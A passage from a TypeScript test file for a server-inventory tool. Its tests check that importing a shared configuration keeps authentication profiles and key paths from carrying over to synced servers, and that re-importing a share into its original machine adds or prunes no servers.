      const file = JSON.parse(await exportShare(sender));
      const edited = file.authProfiles.find((p: AuthProfile) => p.name === "Lab login");
      edited.authType = "key";
      if (keyPath !== undefined) {
        edited.keyPath = keyPath;
      }
      const recipient = await makeMachine();
      await importShare(recipient, JSON.stringify(file));
      const snapshot = recipient.core.getSnapshot();
      const sourceId = snapshot.inventorySources[0].id;

      const plan = planOn(recipient, sourceId);

      expect(plan.updates).toEqual([]);
      expect(plan.unchangedCount).toBe(3);
      const landed = snapshot.authProfiles.find((p) => p.name === "Lab login")!;
      expect(landed.authType).toBe("key");
      expect(landed).not.toHaveProperty("keyPath");
      expect(snapshot.inventorySources[0].authProfileId).toBeUndefined();
      const rows = snapshot.servers.filter((s) => s.origin?.sourceId === sourceId);
      expect(rows).toHaveLength(3);
      for (const row of rows) {
        expect(row.authProfileId).toBeUndefined();
        expect(row.origin?.syncedAuthProfileId).toBeUndefined();
      }
    }
  );

  it("shared into the machine it came from, neither source's first sync adds a server (⊘ either copy of the tree being treated as unowned)", async () => {
    const machine = await makeSender();
    const json = await exportShare(machine);

    await importShare(machine, json);

    const sources = machine.core.getSnapshot().inventorySources;
    expect(sources).toHaveLength(2);
    for (const source of sources) {
      const plan = planOn(machine, source.id);
      expect(plan.adds).toEqual([]);
      expect(plan.prunes).toEqual([]);
    }
  });
});
